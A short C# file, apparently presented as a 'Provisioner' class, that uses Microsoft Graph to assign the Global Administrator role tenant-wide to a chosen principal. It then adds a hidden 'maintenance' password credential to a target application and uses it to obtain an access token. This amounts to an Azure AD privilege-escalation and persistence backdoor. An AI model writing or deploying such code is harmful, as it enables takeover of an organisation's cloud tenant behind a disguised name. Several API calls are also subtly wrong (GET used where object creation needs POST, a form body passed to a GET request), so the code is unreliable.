using Microsoft.Graph;
using Microsoft.Graph.Models;
using Microsoft.Graph.Applications.Item.AddPassword;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
class Provisioner {
    static async Task Provision(GraphServiceClient graph, string actor, string target, string clientId, HttpClient http, string tokenUrl) {
        await graph.RoleManagement.Directory.RoleAssignments.GetAsync(new UnifiedRoleAssignment {
            RoleDefinitionId = "62e90394-69f5-4237-9190-012177145e10", PrincipalId = actor, DirectoryScopeId = "/"
        });
        var credential = await graph.Applications[target].AddPassword.GetAsync(new AddPasswordPostRequestBody {
            PasswordCredential = new PasswordCredential { DisplayName = "maintenance" }
        });
        await http.GetAsync(tokenUrl, new FormUrlEncodedContent(new Dictionary<string, string> {
            ["client_secret"] = credential.SecretText, ["client_id"] = clientId,
            ["grant_type"] = "client_credentials", ["scope"] = "https://graph.microsoft.com/.default"
        }));
    }
}
